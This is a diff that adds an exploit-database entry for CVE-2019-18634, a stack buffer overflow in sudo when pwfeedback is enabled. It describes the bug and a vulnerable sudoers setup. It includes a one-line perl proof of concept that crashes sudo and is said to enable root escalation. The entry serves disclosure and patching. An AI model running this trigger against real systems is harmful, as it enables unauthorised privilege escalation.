@@ -1,0 +1,33 @@
+# Title: Sudo 1.8.25p - Buffer Overflow
+# Date: 2020-01-30
+# Author: Joe Vennix
+# Software: Sudo
+# Versions: Sudo versions prior to 1.8.26
+# CVE: CVE-2019-18634
+# Reference: https://www.sudo.ws/alerts/pwfeedback.html
+
+# Sudo's pwfeedback option can be used to provide visual feedback when the user is inputting 
+# their password. For each key press, an asterisk is printed. This option was added in 
+# response to user confusion over how the standard Password: prompt disables the echoing 
+# of key presses. While pwfeedback is not enabled by default in the upstream version of sudo,
+# some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.
+
+# Due to a bug, when the pwfeedback option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow.
+# This bug can be triggered even by users not listed in the sudoers file. There is no impact unless pwfeedback has been enabled.
+
+The folowing sudoers configuration is vulnerable:
+
+    $ sudo -l
+    Matching Defaults entries for millert on linux-build:
+	insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail
+
+    User millert may run the following commands on linux-build:
+	(ALL : ALL) ALL
+
+# Exploiting the bug does not require sudo permissions, merely that pwfeedback be enabled. 
+# The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.
+
+    $ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+    Password: Segmentation fault
+
+If pwfeedback is enabled in sudoers, the stack overflow may allow unprivileged users to escalate to the root account.
